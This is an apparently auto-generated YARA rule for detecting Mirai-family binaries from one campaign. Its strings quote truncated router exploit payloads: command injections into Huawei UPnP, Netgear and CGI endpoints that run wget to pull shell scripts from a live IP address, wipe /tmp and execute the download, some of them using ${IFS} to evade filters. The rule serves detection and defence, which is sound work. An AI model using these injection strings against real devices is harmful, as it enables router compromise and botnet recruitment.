rule Sightlines_tlsh_d2bf224b_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-d2bf224b"
        date = "2026-10-15"
        campaign = "tlsh-d2bf224b"
        family = "mirai"
        hash = "35b3c0f85872047ee77e8542e73d9b21e498d3a494ca33624672620eb70e9f06"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-d2bf224b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ce:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -q -O /tmp/huawei 'http://176.65.139.157/te" ascii
        $s1 = "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-ins" ascii
        $s2 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://176.65.139.157/wawan." ascii
        $s3 = "OAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><u:SetNTPServers xm" ascii
        $s4 = "lnet.sh'; sh /tmp/huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgra" ascii
        $s5 = "GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http://176.65.139.157/telnet." ascii
        $s6 = "GET /cgi-bin/;cd${IFS}/var/tmp;rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://176.65.139.157/telnet.sh;${" ascii
        $s7 = "e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=" ascii
        $s8 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://176.65.139.157/wawan.sh+-O" ascii
        $s9 = "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://176.65.139.157/telnet.sh;sh+/tmp/vacron" ascii
        $s10 = "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" S" ascii
        $s11 = "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://176.65.139.157/telnet.sh;sh+/tmp/awsec2" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1062152 and 12 of them
}
